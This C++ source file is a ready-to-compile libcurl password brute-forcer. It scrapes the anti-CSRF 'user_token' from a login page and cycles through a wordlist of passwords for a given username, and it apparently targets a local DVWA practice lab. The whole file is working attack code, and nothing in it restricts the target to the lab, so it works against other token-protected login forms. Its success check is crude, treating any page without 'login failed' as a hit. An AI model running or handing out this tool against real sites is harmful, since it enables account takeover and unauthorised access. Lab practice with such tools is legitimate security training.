#include <curl/curl.h>
#include <iostream>
#include <fstream>
#include <string>
#include <regex>
#include <thread>
#include <chrono>
#include <algorithm>
#include <cctype>

static size_t WriteCallback(void* contents, size_t size, size_t nmemb, void* userp) {
    size_t total = size * nmemb;
    std::string* s = static_cast<std::string*>(userp);
    s->append(static_cast<char*>(contents), total);
    return total;
}

static std::string to_lower(const std::string& s) {
    std::string out = s;
    std::transform(out.begin(), out.end(), out.begin(), [](unsigned char c){ return std::tolower(c); });
    return out;
}

static bool extract_user_token(const std::string& html, std::string& token_out) {
    std::smatch m;
    std::regex re(R"(<input[^>]*name=['"]user_token['"][^>]*value=['"]([^'"]+)['"][^>]*>)", std::regex::icase);
    if (std::regex_search(html, m, re) && m.size() > 1) {
        token_out = m[1].str();
        return true;
    }

    std::regex re2(R"(name=user_token[^>]*value=([^\s>]+))", std::regex::icase);
    if (std::regex_search(html, m, re2) && m.size() > 1) {
        token_out = m[1].str();
        if (!token_out.empty() && (token_out.front() == '"' || token_out.front() == '\'')) token_out.erase(0,1);
        if (!token_out.empty() && (token_out.back() == '"' || token_out.back() == '\'')) token_out.pop_back();
        return true;
    }
    return false;
}

static bool is_login_success(const std::string& html) {
    if (html.empty()) return false;

    std::string lc = to_lower(html);

    static const std::vector<std::string> failure_phrases = {
        "login failed",
    };

    for (const auto &p : failure_phrases) {
        if (lc.find(p) != std::string::npos) return false;
    }

    return true;
}

int main(int argc, char* argv[]) {
    if (argc < 4) {
        std::cerr << "Usage: " << argv[0] << " <login_page_url> <wordlist.txt> <username> [delay_seconds]\n";
        return 1;
    }

    std::string login_url = argv[1];
    std::string wordlist_file = argv[2];
    std::string username = argv[3];
    double delay_secs = 1.0;
    if (argc >= 5) delay_secs = std::stod(argv[4]);

    std::ifstream infile(wordlist_file);
    if (!infile) {
        std::cerr << "Cannot open wordlist file: " << wordlist_file << "\n";
        return 1;
    }

    CURL* curl = curl_easy_init();
    if (!curl) {
        std::cerr << "curl_easy_init failed\n";
        return 1;
    }

    curl_easy_setopt(curl, CURLOPT_COOKIEFILE, ""); 
    curl_easy_setopt(curl, CURLOPT_FOLLOWLOCATION, 1L);
    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, WriteCallback);

    curl_easy_setopt(curl, CURLOPT_USERAGENT, "DVWA-Local-Bruteforce/1.0");

    std::string line;
    int attempt = 0;
    bool found = false;

    std::cout << "DVWA local bruteforce helper\n";
    std::cout << "Target: " << login_url << "\n";
    std::cout << "Wordlist: " << wordlist_file << "\n";
    std::cout << "Username: " << username << "\n";
    std::cout << "Delay between attempts: " << delay_secs << "s\n";
    std::cout << "Make sure this is run only against your local DVWA instance.\n\n";

    while (std::getline(infile, line)) {
        std::string password = line;
        ++attempt;

        std::string get_response;
        curl_easy_setopt(curl, CURLOPT_URL, login_url.c_str());
        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &get_response);
        curl_easy_setopt(curl, CURLOPT_CONNECTTIMEOUT, 10L);
        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 20L);

        CURLcode res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "[" << attempt << "] GET error: " << curl_easy_strerror(res) << "\n";
            std::this_thread::sleep_for(std::chrono::duration<double>(delay_secs));
            continue;
        }

        std::string user_token;
        if (!extract_user_token(get_response, user_token)) {
            std::cerr << "[" << attempt << "] Failed to extract user_token from login page. Aborting.\n";
            std::cerr << "    Hint: check that " << login_url << " is correct DVWA login page and that DVWA is accessible locally.\n";
            break;
        }

        char* esc_user = curl_easy_escape(curl, username.c_str(), 0);
        char* esc_pass = curl_easy_escape(curl, password.c_str(), 0);
        char* esc_token = curl_easy_escape(curl, user_token.c_str(), 0);

        std::string post_fields = "username=" + std::string(esc_user ? esc_user : "") +
                                  "&password=" + std::string(esc_pass ? esc_pass : "") +
                                  "&Login=Login&user_token=" + std::string(esc_token ? esc_token : "");

        if (esc_user) curl_free(esc_user);
        if (esc_pass) curl_free(esc_pass);
        if (esc_token) curl_free(esc_token);

        std::string post_response;
        curl_easy_setopt(curl, CURLOPT_URL, login_url.c_str());
        curl_easy_setopt(curl, CURLOPT_POST, 1L);
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_fields.c_str());
        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)post_fields.size());
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, &post_response);

        res = curl_easy_perform(curl);
        if (res != CURLE_OK) {
            std::cerr << "[" << attempt << "] POST error: " << curl_easy_strerror(res) << "\n";
            curl_easy_setopt(curl, CURLOPT_POST, 0L);
            std::this_thread::sleep_for(std::chrono::duration<double>(delay_secs));
            continue;
        }

        curl_easy_setopt(curl, CURLOPT_POST, 0L);

        bool success = is_login_success(post_response);

        std::cout << "[" << attempt << "] try: \"" << password << "\" -> " << (success ? "SUCCESS" : "failed") << "\n";

        if (success) {
            std::cout << "\nPassword FOUND: \"" << password << "\" (username: " << username << ")\n";
            found = true;
            break;
        }

        std::this_thread::sleep_for(std::chrono::duration<double>(delay_secs));
    }

    if (!found) {
        std::cout << "\n  Finished wordlist. Password not found (or success detection failed).\n";
        std::cout << "    If you believe a password exists in the list, try lowering delay, checking detection heuristics,\n";
        std::cout << "    or inspect server responses for the exact success text and update is_login_success().\n";
    }

    curl_easy_cleanup(curl);
    infile.close();
    return 0;
}

// g++ post_brutforce.cpp -lcurl -o brutforce
// ./brutforce "http://127.0.0.1/DVWA/login.php" wordlist.txt admin 0.8